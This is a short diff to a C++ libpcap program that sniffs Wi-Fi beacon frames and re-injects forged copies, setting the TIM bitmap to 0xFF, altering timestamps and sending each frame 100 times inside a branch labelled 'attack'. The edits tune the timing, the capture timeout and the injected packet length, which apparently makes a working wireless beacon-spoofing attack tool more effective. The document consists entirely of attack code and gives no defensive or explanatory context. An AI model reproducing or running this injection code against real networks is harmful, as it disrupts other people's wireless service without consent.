@@ -32,7 +32,7 @@ int main(int argc, char* argv[]) {
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, -1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
 		return -1;
@@ -80,7 +80,7 @@ int main(int argc, char* argv[]) {
 
 				le8_t bitmap = tim->bitmap_;
 				if (bitmap == 0xFF) {
-					GTRACE("bitmap=0x%X\n", tim->bitmap_);
+					//GTRACE("bitmap=0x%X\n", tim->bitmap_);
 					break;
 				}
 				bool attack = true;
@@ -106,10 +106,10 @@ int main(int argc, char* argv[]) {
 					static __useconds_t timstampIncment = 100000; // 100 msec
 					beaconHdr->fixed_.timestamp_ = timestamp + le64_t(timstampIncment); // gilgil temp
 					tim->bitmap_ = 0xFF;
-					usleep(timstampIncment - 5000); // -5 msec
+					usleep(timstampIncment - 10000); // -10 msec
 					for (int i = 0; i < 100; i++) {
 						beaconHdr->fixed_.timestamp_ = timestamp + 1000; // gilgil temp
-						int res = pcap_sendpacket(handle, packet, header->caplen);
+						int res = pcap_sendpacket(handle, packet, header->caplen -1);
 						if (res != 0) {
 							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
 						}
